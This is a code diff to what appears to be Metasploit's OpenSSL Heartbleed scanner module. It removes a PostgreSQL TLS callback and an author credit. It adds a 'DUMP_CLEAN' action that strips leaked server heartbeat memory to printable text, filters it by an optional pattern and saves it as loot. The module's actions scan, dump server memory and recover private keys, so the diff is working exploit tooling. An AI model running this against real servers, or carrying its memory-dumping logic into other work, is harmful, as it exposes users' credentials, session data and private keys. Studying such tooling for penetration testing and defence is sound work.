@@ -80,8 +80,7 @@ class Metasploit3 < Msf::Auxiliary
     'IMAP'   => :tls_imap,
     'JABBER' => :tls_jabber,
     'POP3'   => :tls_pop3,
-    'FTP'    => :tls_ftp,
-    'POSTGRES'   => :tls_postgres
+    'FTP'    => :tls_ftp
   }
 
   # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252
@@ -112,8 +111,7 @@ class Metasploit3 < Msf::Auxiliary
         'Sebastiano Di Paola', # Msf module
         'Tom Sellers', # Msf module
         'jjarmoc', #Msf module; keydump, refactoring..
-        'Ben Buchanan', #Msf module
-        'herself' #Msf module
+        'Ben Buchanan' #Msf module
       ],
       'References'     =>
         [
@@ -131,6 +129,7 @@ class Metasploit3 < Msf::Auxiliary
         [
           ['SCAN',  {'Description' => 'Check hosts for vulnerability'}],
           ['DUMP',  {'Description' => 'Dump memory contents'}],
+          ['DUMP_CLEAN', {'Description' => 'Dump readable memory contents'}],
           ['KEYS',  {'Description' => 'Recover private keys from memory'}]
         ],
       'DefaultAction' => 'SCAN'
@@ -139,7 +138,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(443),
-        OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP', 'POSTGRES' ]]),
+        OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP' ]]),
         OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
         OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 10]),
         OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
@@ -224,22 +223,6 @@ class Metasploit3 < Msf::Auxiliary
     sock.get_once(-1, response_timeout)
   end
 
-  def tls_postgres
-    # postgresql TLS - works with all modern pgsql versions - 8.0 - 9.3
-    # http://www.postgresql.org/docs/9.3/static/protocol-message-formats.html
-    sock.get_once
-    # the postgres SSLRequest packet is a int32(8) followed by a int16(1234), 
-    # int16(5679) in network format
-    psql_sslrequest = [8].pack('N')
-    psql_sslrequest << [1234, 5679].pack('n*')
-    sock.put(psql_sslrequest)
-    res = sock.get_once
-    unless res && res =~ /S/
-      return nil
-    end
-    res
-  end
-
   def tls_pop3
     # http://tools.ietf.org/html/rfc2595
     sock.get_once(-1, response_timeout)
@@ -309,6 +292,8 @@ class Metasploit3 < Msf::Auxiliary
       loot_and_report(bleed)
     when 'DUMP'
       loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
+    when 'DUMP_CLEAN'
+      loot_and_report(bleed)
     when 'KEYS'
       getkeys()
     else
@@ -397,6 +382,22 @@ class Metasploit3 < Msf::Auxiliary
         "OpenSSL Heartbleed server memory"
       )
       print_status("#{peer} - Heartbeat data stored in #{path}")
+  	elsif action.name == 'DUMP_CLEAN'
+  	  pattern = datastore['DUMPFILTER']
+  	  if pattern
+  	  	match_data = heartbeat_data.scan(pattern).join.gsub(/[^[:print:]]/, '')
+  	  else
+  	  	match_data = heartbeat_data.gsub(/[^[:print:]]/, '')
+  	  end
+  	  path = store_loot(
+        "openssl.heartbleed.server",
+        "application/octet-stream",
+        rhost,
+        match_data,
+        nil,
+        "OpenSSL Heartbleed server memory"
+  	  )
+  	  print_status("#{peer} - Heartbeat data stored in #{path}")
     end
 
     vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
